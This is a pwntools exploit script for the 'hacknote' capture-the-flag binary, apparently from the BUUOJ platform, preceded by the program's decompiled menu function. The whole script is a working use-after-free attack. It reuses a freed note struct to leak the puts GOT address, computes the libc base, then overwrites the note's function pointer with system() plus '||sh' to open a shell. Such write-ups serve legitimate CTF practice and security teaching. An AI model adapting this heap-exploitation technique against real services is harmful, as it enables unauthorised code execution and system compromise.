'''
int menu()
{
  puts("----------------------");
  puts("       HackNote       ");
  puts("----------------------");
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
  puts("----------------------");
  return printf("Your choice :");
}
'''

from pwn import *

# r = remote('node5.buuoj.cn', 25792)
# elf = ELF(r'../../../pwn_file/hacknote')
# libc = ELF(r'../../libc/libc-2.23_32.so')
r = process('./hacknote')
elf = ELF('./hacknote')
libc = ELF(r'./libc/libc-2.23.so')

context.log_level = 'debug'


def menu(index):
    r.sendlineafter(b'choice :', index)


def delete(index):
    menu(b'2')
    r.sendlineafter(b'Index :', index)


def _print(index):
    menu(b'3')
    r.sendlineafter(b'Index :', index)


def add(size, content):
    menu(b'1')
    r.sendlineafter(b'Note size :', size)
    r.sendlineafter(b'Content :', content)


add(b'16', b'A' * 0x10)
add(b'16', b'B' * 0x10)

delete(b'0')
delete(b'1')

chunk_self_puts_addr = 0x804862B
puts_got = elf.got['puts']
# puts_plt = elf.plt['puts']

add(b'8', p32(chunk_self_puts_addr) + p32(puts_got))
_print(b'0')
puts_addr = u32(r.recv(4).ljust(4, b'\x00'))
print(hex(puts_addr))

base_addr = puts_addr - libc.sym['puts']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

print(hex(system_addr))
print(hex(sh_addr))

delete(b'2')
add(b'8', p32(system_addr) + b'||sh')
_print(b'0')
r.interactive()
